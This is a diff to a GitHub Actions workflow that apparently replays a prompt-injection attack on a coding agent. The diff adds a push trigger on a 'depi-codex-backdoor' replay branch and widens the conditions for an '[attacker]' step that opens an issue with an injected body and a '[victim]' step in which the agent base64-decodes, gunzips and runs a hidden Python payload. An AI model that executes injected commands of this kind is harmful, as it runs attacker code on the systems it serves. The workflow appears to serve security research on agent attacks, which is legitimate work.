@@ -49,6 +49,9 @@ on:
         required: false
         default: "420"
         type: string
+  push:
+    branches: [replay/depi-codex-backdoor]
+    paths: [replay/depi/.trigger-stage1]
 
 permissions:
   contents: read
@@ -107,7 +110,7 @@ jobs:
       # body, with this branch's payload blob in the diagnostic command.
       # ------------------------------------------------------------------
       - name: "[attacker] open the malicious issue (exact injected body)"
-        if: ${{ inputs.variant == 'malicious' }}
+        if: ${{ inputs.variant != 'clean' }}
         env:
           GH_TOKEN: ${{ github.token }}
         run: |
@@ -148,7 +151,7 @@ jobs:
       # while the attacker (stage 2) uses it.
       # ------------------------------------------------------------------
       - name: "[victim] agent executes the injected diagnostic"
-        if: ${{ inputs.variant == 'malicious' }}
+        if: ${{ inputs.variant != 'clean' }}
         run: |
           set +e
           bash -lc "echo '$(cat /tmp/payload.b64)' | base64 -d | gunzip > /tmp/diag.py && python3 /tmp/diag.py; echo \"EXIT:\$?\""
